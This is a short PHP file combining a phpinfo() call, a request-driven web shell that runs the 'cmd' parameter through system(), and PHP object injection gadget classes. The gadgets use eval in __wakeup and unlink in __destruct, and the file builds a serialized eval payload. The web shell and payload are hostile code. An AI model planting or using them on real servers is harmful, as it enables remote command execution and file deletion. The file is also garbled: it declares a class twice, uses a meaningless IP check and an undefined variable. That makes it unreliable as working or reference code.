<?php
phpinfo();

    if ($_SERVER['192.168.2.3'] === "FIXME") { // Set your IP address here
        if(isset($_REQUEST['cmd'])){
            $cmd = ($_REQUEST['cmd']);
            echo "<pre>\n";
            system($cmd);
            echo "</pre>";
        }
    }
class Example1
{
   public $cache_file;

   function __construct()
   {
      // some PHP code...
   }

   function __destruct()
   {
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}

class Example2
{
   private $hook;

   function __construct()
   {
      // some PHP code...
   }

   function __wakeup()
   {
      if (isset($this->hook)) eval($this->hook);
   }
}
class Example2
{
   private $hook = "phpinfo();";
}

print urlencode(serialize(new Example2));

class Example3
{
   protected $obj;

   function __construct()
   {
      // some PHP code...
   }

   function __toString()
   {
      if (isset($this->obj)) return $this->obj->getValue();
   }
}
class SQL_Row_Value
{
   private $_table;

   // some PHP code...

   function getValue($id)
   {
      $sql = "SELECT * FROM {$this->_table} WHERE id = " . (int)$id;
      $result = mysql_query($sql, $DBFactory::getConnection());
      $row = mysql_fetch_assoc($result);

      return $row['value'];
   }
}


?>
